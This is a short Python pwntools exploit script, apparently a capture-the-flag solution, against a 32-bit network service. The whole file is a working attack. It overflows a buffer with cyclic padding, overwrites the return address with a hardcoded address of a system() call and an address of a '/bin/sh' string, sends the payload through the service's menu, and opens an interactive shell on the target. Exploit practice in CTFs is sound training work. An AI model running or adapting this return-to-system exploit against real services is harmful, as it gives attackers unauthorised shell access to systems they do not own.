from pwn import *

# padding to return pointer
payload = b"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaa"
payload += p32(0x08049214)      # location of system() call
# in i386 arguments are stored on the stack
payload += p32(0x804a09a)       # location of "/bin/sh" string

# nc host port
if args['connection-info']:
    _, host, port = args['connection-info'].split(' ')
    p = remote(host, port)
else:
    p = remote("localhost", 1358)   # im running it locally while testing this

print(p.recvuntil(b"> "))
p.sendline(b"2")
print(p.recvuntil(b":\n"))
p.sendline(payload)

p.interactive()
